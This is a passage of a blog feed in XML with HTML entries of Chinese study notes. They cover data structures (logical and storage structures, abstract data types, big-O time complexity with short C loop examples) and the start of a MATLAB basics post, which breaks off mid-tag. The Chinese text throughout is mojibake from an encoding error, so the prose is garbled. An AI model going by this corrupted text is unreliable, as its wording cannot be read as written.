Â¶ÇÊûúÊúâÈúÄË¶Å‰ΩøÁî®Â≠òÂÇ®‰ø°ÊÅØÁöÑÈòüÂàóÔºå‰∏çÂª∫ËÆÆ‰ΩøÁî®Âæ™ÁéØÈòüÂàóÔºåÂõ†‰∏∫Âæ™ÁéØÈòüÂàó‰∏ÄÊó¶Ë∂ÖÂá∫ÂÆö‰πâÁöÑÂ§ßÂ∞èÔºåÂ∞±‰ºöÂØπ‰πãÂâçÂ≠òÂÇ®ÁöÑ‰ø°ÊÅØÂèëÁîüË¶ÜÁõñÔºàÂèëÁîüÂÅáÊ∫¢Âá∫Ôºâ„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ÁÆóÊ≥ï </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> ÁÆóÊ≥ï </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï-day1</title>
      <link href="/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day1/"/>
      <url>/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day1/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï-ÔºàAlgorithmÔºâ-Áª™ËÆ∫"><a href="#Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï-ÔºàAlgorithmÔºâ-Áª™ËÆ∫" class="headerlink" title="Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï ÔºàAlgorithmÔºâ- Áª™ËÆ∫"></a>Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï ÔºàAlgorithmÔºâ- Áª™ËÆ∫</h1><h2 id="Êï∞ÊçÆÊòØ‰∏™Âï•Ôºü"><a href="#Êï∞ÊçÆÊòØ‰∏™Âï•Ôºü" class="headerlink" title="Êï∞ÊçÆÊòØ‰∏™Âï•Ôºü"></a>Êï∞ÊçÆÊòØ‰∏™Âï•Ôºü</h2><p> &nbsp; &nbsp; &nbsp; Êï∞ÊçÆÔºàdataÔºâÊòØ‰ø°ÊÅØÁöÑËΩΩ‰ΩìÔºåÊòØÂØπÂÆ¢ËßÇ‰∫ãÁâ©ÁöÑÁ¨¶Âè∑ÂåñË°®Á§∫ÔºåÂÆÉÁöÑÂê´‰πâÊûÅ‰∏∫ÂπøÊ≥õÔºåÂåÖÂê´‰∫Ü‰∫∫‰ª¨Êó•Á©øÁîüÊ¥ª‰∏≠ÁöÑÂêÑÁßç‰ø°ÊÅØÂú®ËÆ°ÁÆóÊú∫ÂÜÖÁöÑË°®Á§∫ÔºåËÄå<strong>Êï∞ÊçÆÂÖÉÁ¥†</strong>ÂàôÊòØÊï∞ÊçÆÁöÑÂü∫Êú¨Âçï‰Ωç„ÄÇ</p><p><img src="http://photo.orsoon.com/JPG-180515/180515_42/k5oFKYNsQz_small.jpg" alt=""></p><h2 id="Êï∞ÊçÆÁªìÊûÑÂÆö‰πâ"><a href="#Êï∞ÊçÆÁªìÊûÑÂÆö‰πâ" class="headerlink" title="Êï∞ÊçÆÁªìÊûÑÂÆö‰πâ"></a>Êï∞ÊçÆÁªìÊûÑÂÆö‰πâ</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; Êï∞ÊçÆÁªìÊûÑÂàÜ‰∏∫ÈÄªËæëÁªìÊûÑÂíåÁâ©ÁêÜÁªìÊûÑÔºå‰ª•ÂèäÊï∞ÊçÆËøêÁÆó‰∏âÊñπÈù¢ÂÜÖÂÆπÔºå‰∏ÄËµ∑Êù•ÊÑâÂø´Âú∞Â≠¶‰π†ÂÆÉÂêßüò≠ÔºÅ</p><h3 id="ÈÄªËæëÁªìÊûÑ‰∏≠Âá†ÁßçÁªìÊûÑÁöÑÂü∫Êú¨ÂÆö‰πâ"><a href="#ÈÄªËæëÁªìÊûÑ‰∏≠Âá†ÁßçÁªìÊûÑÁöÑÂü∫Êú¨ÂÆö‰πâ" class="headerlink" title="ÈÄªËæëÁªìÊûÑ‰∏≠Âá†ÁßçÁªìÊûÑÁöÑÂü∫Êú¨ÂÆö‰πâ"></a>ÈÄªËæëÁªìÊûÑ‰∏≠Âá†ÁßçÁªìÊûÑÁöÑÂü∫Êú¨ÂÆö‰πâ</h3><p>‚ë† Á∫øÊÄßÁªìÊûÑ(1:1)ÔºöÁªìÊûÑ‰∏≠ÁöÑÊï∞ÊçÆÂÖÉÁ¥†‰πãÈó¥Â≠òÂú®ÁùÄ‰∏ÄÂØπ‰∏ÄÁöÑÂÖ≥Á≥ªÔºåÂ¶ÇË°®ÔºåÊ†àÔºåÈòüÂàóÁ≠â„ÄÇ</p><p>‚ë° Ê†ëÂΩ¢ÁªìÊûÑ(1:n)ÔºöÁªìÊûÑ‰∏≠ÁöÑÊï∞ÊçÆÂÖÉÁ¥†‰πãÈó¥Â≠òÂú®ÁùÄ‰∏ÄÂØπÂ§öÁöÑÂÖ≥Á≥ª„ÄÇ</p><p>‚ë¢ ÂõæÂΩ¢ÁªìÊûÑ(m:n)ÔºöÁªìÊûÑ‰∏≠ÁöÑÊï∞ÊçÆÂÖÉÁ¥†‰πãÈó¥Â≠òÂú®ÁùÄÂ§öÂØπÂ§öÁöÑÂÖ≥Á≥ªÔºåÂõæÂΩ¢ÁªìÊûÑ‰πüË¢´Áß∞‰∏∫ÁΩëÁä∂ÁªìÊûÑ„ÄÇ</p><p>‚ë£ ÈõÜÂêàÁªìÊûÑÔºöÈõÜÂêàÁªìÊûÑ‰∏≠ÁöÑÊï∞ÊçÆÂÖÉÁ¥†‰πãÈó¥ÁöÑÂÖ≥Á≥ª‰ªÖ‰ªÖÊòØ‚ÄùÂ±û‰∫éÂêå‰∏Ä‰∏™ÈõÜÂêà‚ÄùÔºåËøôÁßçÁªìÊûÑ‰∏≠ÁöÑÂÖÉÁ¥†ÂÖ≥Á≥ªÊûÅ‰∏∫ÊùæÊï£ÔºåËØ•ÁªìÊûÑËæÉ‰∏∫Â∞ëËßÅ„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ÊÄª‰ΩìÊù•ËØ¥ÔºåÊ†πÊçÆÊï∞ÊçÆÂÖÉÁ¥†‰πãÈó¥Â≠òÂú®ÁöÑ‰∏çÂêåÂÖ≥Á≥ªÔºåÊï∞ÊçÆÁªìÊûÑÂèØÂàÜ‰∏∫<strong>Á∫øÊÄßÁªìÊûÑÂíåÈùûÁ∫øÊÄßÁªìÊûÑüò±</strong>„ÄÇ</p><p><img src="https://i.loli.net/2018/10/07/5bb97795e5dd5.png" alt=""></p><h3 id="Êï∞ÊçÆÁªìÊûÑ‰∏≠ÁöÑÁâ©ÁêÜÁªìÊûÑ"><a href="#Êï∞ÊçÆÁªìÊûÑ‰∏≠ÁöÑÁâ©ÁêÜÁªìÊûÑ" class="headerlink" title="Êï∞ÊçÆÁªìÊûÑ‰∏≠ÁöÑÁâ©ÁêÜÁªìÊûÑ"></a>Êï∞ÊçÆÁªìÊûÑ‰∏≠ÁöÑÁâ©ÁêÜÁªìÊûÑ</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; Êï∞ÊçÆÁöÑÈÄªËæëÁªìÊûÑÂíåÊï∞ÊçÆÁöÑÂ≠òÂÇ®Êó†ÂÖ≥ÔºåÂØπÊï∞ÊçÆÁöÑÊìç‰Ωú‰∏ªË¶Å‰æùËµñÊï∞ÊçÆÁöÑÂ≠òÂÇ®ÔºåËÄåÊï∞ÊçÆÂú®ËÆ°ÁÆóÊú∫‰∏≠ÁöÑÂ≠òÂÇ®Ë°®Á§∫Âç≥Êï∞ÊçÆÁöÑÂ≠òÂÇ®ÁªìÊûÑÂèØÂàÜ‰∏∫<strong>È°∫Â∫èÂ≠òÂÇ®</strong>Âíå<strong>ÈùûÈ°∫Â∫èÂ≠òÂÇ®</strong>Ôºå‰ΩÜÈíàÂØπ‰∏Ä‰∫õÁâπÊÆäÂ∫îÁî®ÔºåËøòÊúâ<strong>Á¥¢ÂºïÂ≠òÂÇ®ÁªìÊûÑÔºåÊï£ÂàóÂ≠òÂÇ®ÔºàhashÊñπÊ≥ïÔºâÁªìÊûÑ</strong>Á≠âÂÖ∂‰ªñË°®Á§∫ÊñπÊ≥ï„ÄÇ</p><p>‚ë† <strong>È°∫Â∫èÂ≠òÂÇ®ÊñπÊ≥ï</strong>ÔºöÊääÈÄªËæë‰∏äÁõ∏ÈÇªÁöÑÊï∞ÊçÆÂÖÉÁ¥†ÂÇ®Â≠òÂú®Áâ©ÁêÜ‰ΩçÁΩÆ‰∏ä‰πüÁõ∏ÈÇªÁöÑÂ≠òÂÇ®ÂçïÂÖÉ‰∏≠Ôºå‰æãÂ¶ÇÊï∞ÁªÑÂç≥ÊòØÈ°∫Â∫èÂ≠òÂÇ®ÊñπÊ≥ï„ÄÇ</p><p>‚ë° <strong>ÈìæÂºèÂ≠òÂÇ®ÊñπÊ≥ï</strong>ÔºöÈÄªËæë‰∏äÁõ∏ÈÇªÁöÑÊï∞ÁªÑÂÖÉÁ¥†‰∏çË¶ÅÊ±ÇÂÖ∂Âú®Áâ©ÁêÜ‰ΩçÁΩÆ‰∏ä‰πüÁõ∏ÈÇªÔºåÈÄöËøáÈôÑËÆæÁöÑÊåáÈíàÂ≠óÊÆµÂÄºÊù•ÊåáÁ§∫Êï∞ÊçÆÁöÑÈÄªËæëÂÖ≥Á≥ªÔºåÁÆóÊ≥ï‰∏≠ÁöÑÊåáÈíàÂ∞±ÊòØÁî±ÈìæÂºèÂ≠òÂÇ®ÁªìÊûÑÂÆûÁé∞ÁöÑ„ÄÇ</p><p>‚ë¢ Á¥¢ÂºïÂ≠òÂÇ®ÊñπÊ≥ïÔºöÈô§Âª∫Á´ãÂ≠òÂÇ®ÁªìÁÇπ‰ø°ÊÅØÂ§ñÔºåËøòÂª∫Á´ãÈôÑÂä†ÁöÑÁ¥¢ÂºïË°®Êù•Ê†áËØÜÁªìÁÇπÁöÑÂú∞ÂùÄÔºåÁ¥¢ÂºïË°®Áî±Ëã•Âπ≤Á¥¢ÂºïÈ°πÁªÑÊàê„ÄÇ <strong>Dense IndexÔºàÁ®†ÂØÜÁ¥¢ÂºïÔºâ</strong>‰ª£Ë°®ÊØè‰∏™Êï∞ÊçÆÂÖÉÁ¥†Âú®Á¥¢ÂºïË°®‰∏≠ÂùáÊúâ‰∏Ä‰∏™Á¥¢ÂºïÈ°π„ÄÇ<strong>Sparse IndexÔºàÁ®ÄÁñèÁ¥¢ÂºïÔºâ</strong>Ôºå‰ª£Ë°®‰∏Ä‰∏™Á¥¢ÂºïÈ°πÂØπÂ∫î‰∏ÄÁªÑÊï∞ÊçÆÂÖÉÁ¥†Ôºå<a href="https://www.cnblogs.com/FreeFire/p/4329528.html" target="_blank" rel="noopener">ÂèÇËÄÉÈìæÊé•</a>„ÄÇ</p><p>‚ë£ Êï£ÂàóÂ≠òÂÇ®ÊñπÊ≥ïÔºàHashÊñπÊ≥ïÔºâÔºöÊï£ÂàóÊòØÊï∞ÁªÑÂ≠òÂÇ®ÊñπÂºèÁöÑ‰∏ÄÁßçÂèëÂ±ïÔºåÁõ∏ÊØîÊï∞ÁªÑÔºåÊï£ÂàóÁöÑÊï∞ÊçÆËÆøÈóÆÈÄüÂ∫¶Ë¶ÅÈ´ò‰∫éÊï∞ÁªÑÔºåÂõ†‰∏∫ÂèØ‰ª•‰æùÊçÆÂ≠òÂÇ®Êï∞ÊçÆÁöÑÈÉ®ÂàÜÂÜÖÂÆπÊâæÂà∞Êï∞ÊçÆÂú®Êï∞ÁªÑ‰∏≠ÁöÑÂ≠òÂÇ®‰ΩçÁΩÆÔºåËøõËÄåËÉΩÂ§üÂø´ÈÄüÂÆûÁé∞Êï∞ÊçÆÁöÑËÆøÈóÆÔºåÁêÜÊÉ≥ÁöÑÊï£ÂàóËÆøÈóÆÈÄüÂ∫¶ÊòØÈùûÂ∏∏ËøÖÈÄüÁöÑÔºåËÄå‰∏çÂÉèÂú®Êï∞ÁªÑ‰∏≠ÁöÑÈÅçÂéÜËøáÁ®ãÔºåÈááÁî®Â≠òÂÇ®Êï∞ÁªÑ‰∏≠ÂÜÖÂÆπÁöÑÈÉ®ÂàÜÂÖÉÁ¥†‰Ωú‰∏∫Êò†Â∞ÑÂáΩÊï∞ÁöÑËæìÂÖ•ÔºåÊò†Â∞ÑÂáΩÊï∞ÁöÑËæìÂá∫Â∞±ÊòØÂ≠òÂÇ®Êï∞ÊçÆÁöÑ‰ΩçÁΩÆÔºåËøôÊ†∑ÁöÑËÆøÈóÆÈÄüÂ∫¶Â∞±ÁúÅÂéª‰∫ÜÈÅçÂéÜÊï∞ÁªÑÁöÑÂÆûÁé∞ÔºåÂõ†Ê≠§<strong>Êó∂Èó¥Â§çÊùÇÂ∫¶ÂèØ‰ª•ËÆ§‰∏∫‰∏∫O(1)</strong>ÔºåËÄå<strong>Êï∞ÁªÑÈÅçÂéÜÁöÑÊó∂Èó¥Â§çÊùÇÂ∫¶‰∏∫O(n)</strong>Ôºå<a href="https://baike.baidu.com/item/%E6%95%A3%E5%88%97%E5%AD%98%E5%82%A8%E6%96%B9%E6%B3%95/9663463?fr=aladdin" target="_blank" rel="noopener">ÂèÇËÄÉÈìæÊé•</a>„ÄÇ</p><h2 id="ÊäΩË±°Êï∞ÊçÆÁ±ªÂûãÔºàAbstract-Data-TypeÔºåADTÔºâ"><a href="#ÊäΩË±°Êï∞ÊçÆÁ±ªÂûãÔºàAbstract-Data-TypeÔºåADTÔºâ" class="headerlink" title="ÊäΩË±°Êï∞ÊçÆÁ±ªÂûãÔºàAbstract Data TypeÔºåADTÔºâ"></a>ÊäΩË±°Êï∞ÊçÆÁ±ªÂûãÔºàAbstract Data TypeÔºåADTÔºâ</h2><p> &nbsp; &nbsp; &nbsp; ADT ÁöÑÂÆö‰πâÔºö‰∏Ä‰∏™Êï∞Â≠¶Ê®°Âûã‰ª•ÂèäÂÆö‰πâÂú®ËØ•Ê®°Âûã‰∏äÁöÑ‰∏ÄÁªÑÊìç‰Ωú„ÄÇÊèèËø∞Êï∞ÊçÆÁªìÊûÑÁöÑ‰∏ÄÁßçÁêÜËÆ∫Â∑•ÂÖ∑„ÄÇ</p><pre class=" language-bash"><code class="language-bash">ADT ÊäΩË±°Êï∞ÊçÆÁ±ªÂûãÂêçÁß∞ <span class="token punctuation">{</span>Êï∞ÊçÆÂØπË±°Ôºö<span class="token operator">&lt;</span>Êï∞ÊçÆÂØπË±°ÂÆö‰πâ<span class="token operator">></span>‚Ä¶‚Ä¶Êï∞ÊçÆÂÖ≥Á≥ªÔºö<span class="token operator">&lt;</span>ÈÄªËæëÂÖ≥Á≥ªÂÆö‰πâ<span class="token operator">></span>‚Ä¶‚Ä¶Êìç‰ΩúÈõÜÂêàÔºö  Êìç‰ΩúÂêç1Ôºö  <span class="token operator">&lt;</span>Âü∫Êú¨Êìç‰Ωú1ÂàùÂßãÊù°‰ª∂ÊèèËø∞<span class="token operator">></span>  <span class="token operator">&lt;</span>Âü∫Êú¨Êìç‰Ωú1Êìç‰ΩúÁªìÊûúÊèèËø∞<span class="token operator">></span>  ‚Ä¶‚Ä¶  ‚Ä¶‚Ä¶  Êìç‰ΩúÂêçnÔºö  <span class="token operator">&lt;</span>Âü∫Êú¨Êìç‰ΩúnÂàùÂßãÊù°‰ª∂ÊèèËø∞<span class="token operator">></span>  <span class="token operator">&lt;</span>Âü∫Êú¨Êìç‰ΩúnÊìç‰ΩúÁªìÊûúÊèèËø∞<span class="token operator">></span><span class="token punctuation">}</span>ADTÊäΩË±°Êï∞ÊçÆÁ±ªÂûãÂêçÁß∞</code></pre><p> &nbsp; &nbsp; &nbsp; ADT ÁöÑ‰ΩúÁî®ÔºöÊäΩË±°Êï∞ÊçÆÁ±ªÂûãÂèØ‰ª•‰ΩøÊàë‰ª¨Êõ¥ÂÆπÊòìÊèèËø∞Áé∞ÂÆû‰∏ñÁïå„ÄÇ‰æãÔºöÁî®Á∫øÊÄßË°®ÊèèËø∞Â≠¶ÁîüÊàêÁª©Ë°®ÔºåÁî®Ê†ëÊàñÂõæÊèèËø∞ÈÅó‰º†ÂÖ≥Á≥ª„ÄÇ<strong>‰ºòÁÇπÊòØÊã•ÊúâËæÉÂº∫ÁöÑÈáçÂ§çÊÄßÔºåÁÅµÊ¥ªÊÄßÔºåÂ∞ÅË£ÖÊÄß„ÄÇ</strong></p><p> &nbsp; &nbsp; &nbsp; ADT ÁöÑÂÖ≥ÈîÆÁâπÂæÅÔºö‰ΩøÁî®ÂÆÉÁöÑ‰∫∫ÂèØ‰ª•Âè™ÂÖ≥ÂøÉÂÆÉÁöÑÈÄªËæëÁâπÂæÅÔºå‰∏çÈúÄË¶Å‰∫ÜËß£ÂÆÉÁöÑÂ≠òÂÇ®ÊñπÂºè„ÄÇÂÆö‰πâÂÆÉÁöÑ‰∫∫ÂêåÊ†∑‰∏çÂøÖË¶ÅÂÖ≥ÂøÉÂÆÉÂ¶Ç‰ΩïÂ≠òÂÇ®„ÄÇ</p><p> &nbsp; &nbsp; &nbsp; ‰æãÂ¶ÇÔºöÁ∫øÊÄßË°®ËøôÊ†∑ÁöÑÊäΩË±°Êï∞ÊçÆÁ±ªÂûãÔºåÂÖ∂Êï∞Â≠¶Ê®°ÂûãÊòØÔºö<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">Êï∞ÊçÆÂÖÉÁ¥†</a>ÁöÑÈõÜÂêàÔºåËØ•ÈõÜÂêàÂÜÖÁöÑÂÖÉÁ¥†ÊúâËøôÊ†∑ÁöÑÂÖ≥Á≥ªÔºöÈô§Á¨¨‰∏Ä‰∏™ÂíåÊúÄÂêé‰∏Ä‰∏™Â§ñÔºåÊØè‰∏™ÂÖÉÁ¥†ÊúâÂîØ‰∏ÄÁöÑÂâçË∂ãÂíåÂîØ‰∏ÄÁöÑÂêéÁªß„ÄÇÂèØ‰ª•ÊúâËøôÊ†∑‰∏Ä‰∫õÊìç‰ΩúÔºöÊèíÂÖ•‰∏Ä‰∏™ÂÖÉÁ¥†„ÄÅÂà†Èô§‰∏Ä‰∏™ÂÖÉÁ¥†Á≠â„ÄÇ</p><p> &nbsp; &nbsp; &nbsp; <strong>‰ªéÊäΩË±°Êï∞ÊçÆÁ±ªÂûãÁöÑËßíÂ∫¶ÁúãÔºåÊï∞ÊçÆÁªìÊûÑÊòØADTÁöÑÁâ©ÁêÜÂÆûÁé∞„ÄÇ</strong></p><h2 id="ÁÆóÊ≥ïÁöÑÂ§çÊùÇÂ∫¶"><a href="#ÁÆóÊ≥ïÁöÑÂ§çÊùÇÂ∫¶" class="headerlink" title="ÁÆóÊ≥ïÁöÑÂ§çÊùÇÂ∫¶"></a>ÁÆóÊ≥ïÁöÑÂ§çÊùÇÂ∫¶</h2><p> &nbsp; &nbsp; &nbsp; ÁÆóÊ≥ïÁöÑÂ§çÊùÇÂ∫¶ÈÄöÂ∏∏ÂàÜ‰∏∫Êó∂Èó¥Â§çÊùÇÂ∫¶ÔºåÁ©∫Èó¥Â§çÊùÇÂ∫¶ÔºåÈááÁî®<strong>‚ÄúÂ§ßOË°®Á§∫Ê≥ï‚Äù</strong>ÂÆö‰πâÁÆóÊ≥ïÊïàÁéáÂ∫¶Èáè„ÄÇ</p><h3 id="Êó∂Èó¥Â§çÊùÇÂ∫¶"><a href="#Êó∂Èó¥Â§çÊùÇÂ∫¶" class="headerlink" title="Êó∂Èó¥Â§çÊùÇÂ∫¶"></a>Êó∂Èó¥Â§çÊùÇÂ∫¶</h3><p> &nbsp; &nbsp; &nbsp; Âà§ÂÆöÁÆóÊ≥ïÊÄßËÉΩÁöÑ‰∏Ä‰∏™Âü∫Êú¨ËÄÉËôëÊòØÂ§ÑÁêÜ‰∏ÄÂÆö<strong>‚ÄúËßÑÊ®°ÔºàSizeÔºâ‚Äù</strong>ÁöÑËæìÂÖ•Êó∂ÔºåËØ•ÁÆóÊ≥ïÊâÄÈúÄÊâßË°åÁöÑ<strong>‚ÄúÂü∫Êú¨Êìç‰ΩúÊï∞ÔºàBasic OperationÔºâ‚Äù„ÄÇ</strong></p><p> &nbsp; &nbsp; &nbsp; T(N) = O(f(N))ÊòØÊåá‰øùËØÅÂáΩÊï∞T(N)‰ª•‰∏çÂø´‰∫éf(N)ÈÄüÂ∫¶Â¢ûÈïøÔºõf(N)ÊòØ‰∏Ä‰∏™‰∏äÁïåÔºàupper boundÔºâÔºåÂç≥Êüê‰∏™ÁÆóÊ≥ïÁöÑÂ¢ûÈïøÁéáÊúÄÂ∑ÆÊÉÖÂÜµÊòØf(N)ÔºåÁªôÂá∫Âá†‰∏™‰æãÂ≠êÔºö</p><pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> <span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//1.ÁÆóÊ≥ïÊó∂Èó¥Â§çÊùÇÂ∫¶‰∏∫ O(1),Áß∞‰∏∫Â∏∏ÈáèÈò∂</span><span class="token number">2</span><span class="token punctuation">.</span> <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//2.ÁÆóÊ≥ïÊó∂Èó¥Â§çÊùÇÂ∫¶‰∏∫ O(n),Áß∞‰∏∫Á∫øÊÄßÈò∂</span><span class="token number">3</span><span class="token punctuation">.</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token operator">++</span>x<span class="token punctuation">;</span>        s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//3.ÁÆóÊ≥ïÊó∂Èó¥Â§çÊùÇÂ∫¶‰∏∫ O(n*n),Áß∞‰∏∫Âπ≥ÊñπÈò∂</span><span class="token number">4</span><span class="token punctuation">.</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">)</span><span class="token punctuation">{</span> i<span class="token operator">=</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//4.ÁÆóÊ≥ïÊó∂Èó¥Â§çÊùÇÂ∫¶‰∏∫ O(log2n),Áß∞‰∏∫ÂØπÊï∞Èò∂</span><span class="token comment" spellcheck="true">//Ê†πÊçÆÂü∫Êú¨ÊâßË°åÊ¨°Êï∞ÔºåËøêÁî®ÊûÅÈôêÁöÑÊñπÊ≥ïÊù•ËÆ°ÁÆóÂ§çÊùÇÂ∫¶</span></code></pre><h3 id="Á©∫Èó¥Â§çÊùÇÂ∫¶"><a href="#Á©∫Èó¥Â§çÊùÇÂ∫¶" class="headerlink" title="Á©∫Èó¥Â§çÊùÇÂ∫¶"></a>Á©∫Èó¥Â§çÊùÇÂ∫¶</h3><p> &nbsp; &nbsp; &nbsp; ‰∏Ä‰∏™Á®ãÂ∫èÁöÑÁ©∫Èó¥Â§çÊùÇÂ∫¶ÊòØÊåá‰ªéÁ®ãÂ∫èËøêË°åÂà∞ÁªìÊùüÊâÄÈúÄÁöÑÂ≠òÂÇ®Èáè„ÄÇËÄåÁ®ãÂ∫èÁöÑÂ≠òÂÇ®Á©∫Èó¥ÂàÜ‰∏∫Âõ∫ÂÆöÈÉ®ÂàÜÂíåÂèØÂèòÈÉ®ÂàÜÔºåÂ∞±ÂÉèÁîµËÑëÂàÜ‰∫ÜÁ°¨ÁõòÂ≠òÂÇ®Á©∫Èó¥ÂíåÂÜÖÂ≠òÂ≠òÂÇ®Á©∫Èó¥‰∏ÄÊ†∑üòÑÔºåÁ®ãÂ∫èÊú¨Ë∫´ÊâÄÂç†ÁöÑÁâ©ÁêÜÁ©∫Èó¥Âä†‰∏äÁ®ãÂ∫èËøêË°åÊó∂ÊâÄÈúÄË¶ÅÁöÑÂÜÖÂ≠òÁªÑÊàê‰∫ÜÁ®ãÂ∫èËøêË°åÊâÄÈúÄÁöÑÂ≠òÂÇ®Á©∫Èó¥„ÄÇ</p><p>Try to get the best answerÔºÅ</p>]]></content>
      
      
      <categories>
          
          <category> ÁÆóÊ≥ï </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ÁÆóÊ≥ï </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Êï∞Â≠¶Âª∫Ê®°-day2</title>
      <link href="/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day2/"/>
      <url>/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day2/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Êï∞Â≠¶Âª∫Ê®°-day2-‚Äì-matlab-Âü∫Êú¨Áî®Ê≥ï"><a href="#Êï∞Â≠¶Âª∫Ê®°-day2-‚Äì-matlab-Âü∫Êú¨Áî®Ê≥ï" class="headerlink" title="Êï∞Â≠¶Âª∫Ê®°_day2 ‚Äì matlab Âü∫Êú¨Áî®Ê≥ï"></a>Êï∞Â≠¶Âª∫Ê®°_day2 ‚Äì matlab Âü∫Êú¨Áî®Ê≥ï</h1><p><img src="https://i.loli.net/2018/10/07/5bb957ec92262.png" alt=""><br>&nbsp; &nbsp; &nbsp; &nbsp; matlab Êï¥‰ΩìÁïåÈù¢Â¶Ç‰∏äÂõæÔºåÂú®matlab‰∏≠‰∏ÄËà¨ÈúÄË¶ÅÂàõÂª∫ÂèòÈáèÔºåË∞ÉÁî®ÂáΩÊï∞ÔºåÂÆö‰πâÂèòÈáèÂíå python Á±ª‰ººÔºå<strong>Â¶ÇÊûúÊ≤°ÊúâÂÆö‰πâËæìÂá∫ÂèòÈáèÔºåmatlabÂàô‰ºö‰ΩøÁî®‰∏Ä‰∏™Âêç‰∏∫ansÁöÑÂèòÈáèÂ≠òÂÇ®ËÆ°ÁÆóÁªìÊûú„ÄÇ</strong></p><p> &nbsp; &nbsp; &nbsp; matlab‰∏ªË¶ÅË¢´Áî®Êù•ÂØπÊï¥‰∏™Áü©ÈòµÊàñËÄÖÊï∞ÁªÑËøõË°åÊìç‰Ωú„ÄÇ</p><h3 id="‰∏Ä-ÈÇ£‰πàÂ¶Ç‰ΩïÊù•ËøõË°åÊï∞ÁªÑÁöÑÂàõÂª∫Âë¢Ôºö"><a href="#‰∏Ä-ÈÇ£‰πàÂ¶Ç‰ΩïÊù•ËøõË°åÊï∞ÁªÑÁöÑÂàõÂª∫Âë¢Ôºö" class="headerlink" title="‰∏Ä. ÈÇ£‰πàÂ¶Ç‰ΩïÊù•ËøõË°åÊï∞ÁªÑÁöÑÂàõÂª∫Âë¢Ôºö"></a>‰∏Ä. ÈÇ£‰πàÂ¶Ç‰ΩïÊù•ËøõË°åÊï∞ÁªÑÁöÑÂàõÂª∫Âë¢Ôºö</h3><ul><li><p>Èöè‰æøÂàõÂª∫‰∏Ä‰∏™‰∏ÄÁª¥Êï∞ÁªÑ a= [1 2 3 4],‰πüÂèØÁß∞‰ΩúÂçïË°åÁü©ÈòµÊàñË°åÂêëÈáè</p><p><img src="https://i.loli.net/2018/10/07/5bb959beb45e8.png" alt=""></p></li><li><p>ÂàõÂª∫Â§öË°åÁü©ÈòµÂàôÁî®ÂàÜÂè∑ÂàÜÂºÄ</p><p><img src="https://i.loli.net/2018/10/07/5bb95a474bb84.png" alt=""></p></li></ul><h3 id="‰∫å-Áî®ÂáΩÊï∞ÂØπÁü©ÈòµÂíåÊï∞ÁªÑËøõË°å‰∏Ä‰∫õÊìç‰ΩúÔºö"><a href="#‰∫å-Áî®ÂáΩÊï∞ÂØπÁü©ÈòµÂíåÊï∞ÁªÑËøõË°å‰∏Ä‰∫õÊìç‰ΩúÔºö" class="headerlink" title="‰∫å. Áî®ÂáΩÊï∞ÂØπÁü©ÈòµÂíåÊï∞ÁªÑËøõË°å‰∏Ä‰∫õÊìç‰ΩúÔºö"></a>‰∫å. Áî®ÂáΩÊï∞ÂØπÁü©ÈòµÂíåÊï∞ÁªÑËøõË°å‰∏Ä‰∫õÊìç‰ΩúÔºö</h3><ul><li><p>sin,cos,tan,cotÁ≠âÂáΩÊï∞ÈÉΩËÉΩ‰ΩøÁî®:</p><p><img src="https://i.loli.net/2018/10/07/5bb95b8054e4c.png" 